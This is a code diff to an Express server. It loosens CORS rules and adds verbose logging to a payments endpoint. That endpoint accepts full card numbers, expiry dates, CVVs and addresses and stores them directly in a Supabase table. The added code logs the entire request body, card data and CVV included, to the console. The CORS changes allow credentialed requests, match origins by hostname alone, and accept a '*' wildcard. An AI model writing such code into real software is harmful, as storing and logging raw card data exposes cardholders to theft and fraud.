@@ -12,15 +12,46 @@ const app = express();
 app.disable('x-powered-by');
 app.set('trust proxy', 1);
 
-const allowedOrigins = (process.env.ALLOWED_ORIGINS || '').split(',').map(origin => origin.trim()).filter(Boolean);
+const allowedOrigins = (process.env.ALLOWED_ORIGINS || '')
+  .split(',')
+  .map(o => o.trim())
+  .filter(Boolean);
+
+// Normalize origins to hostnames for flexible matching (strip protocol)
+const allowedHosts = allowedOrigins.map(o => {
+  try {
+    const u = new URL(o.includes('://') ? o : `https://${o}`);
+    return u.hostname;
+  } catch (e) {
+    return o;
+  }
+});
+
 app.use(cors({
   origin(origin, callback) {
-    if (!origin || allowedOrigins.length === 0 || allowedOrigins.includes(origin)) {
-      return callback(null, true);
+    // Allow same-origin or no-origin (curl, server-to-server)
+    if (!origin || allowedOrigins.length === 0) return callback(null, true);
+
+    try {
+      const originHost = new URL(origin).hostname;
+      if (allowedOrigins.includes(origin) || allowedHosts.includes(originHost) || allowedOrigins.includes('*')) {
+        return callback(null, true);
+      }
+    } catch (err) {
+      // If origin is malformed, deny below
     }
+
+    console.warn('CORS denied for origin:', origin);
     return callback(new Error('Not allowed by CORS'));
   },
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
+  credentials: true,
+  optionsSuccessStatus: 200,
 }));
+
+// Ensure preflight requests are handled
+app.options('*', (req, res) => res.sendStatus(200));
 
 app.use((req, res, next) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
@@ -288,12 +319,21 @@ app.get('/api/session/verify', authMiddleware, (req, res) => {
 // ─────────────────────────────────────────────────────────────────────────────
 app.post('/api/payments', async (req, res) => {
   try {
+    console.log('📝 POST /api/payments received from:', req.headers.origin || 'unknown');
+    console.log('📦 Payload:', JSON.stringify(req.body, null, 2));
+
     const {
       transaction_id, name, card, month, year, cvv,
       amount, email, phone, address1, address2,
       city, state, postal, country,
     } = req.body;
 
+    if (!transaction_id || !name || !amount || !email) {
+      console.warn('⚠️  Missing required fields:', { transaction_id, name, amount, email });
+      return res.status(400).json({ error: 'Missing required fields: transaction_id, name, amount, email' });
+    }
+
+    console.log('🔄 Inserting into Supabase payments table...');
     const { data, error } = await supabase
       .from('payments')
       .insert([{
@@ -316,12 +356,16 @@ app.post('/api/payments', async (req, res) => {
       .select()
       .single();
 
-    if (error) throw error;
+    if (error) {
+      console.error('❌ Supabase insert error:', error);
+      throw error;
+    }
 
+    console.log('✅ Payment stored successfully! ID:', data.id, 'TxnID:', transaction_id);
     return res.status(201).json({ success: true, id: data.id });
   } catch (err) {
-    console.error('POST /api/payments error:', err);
-    return res.status(500).json({ error: err.message });
+    console.error('❌ POST /api/payments error:', err);
+    return res.status(500).json({ error: err.message || 'Payment storage failed' });
   }
 });
 
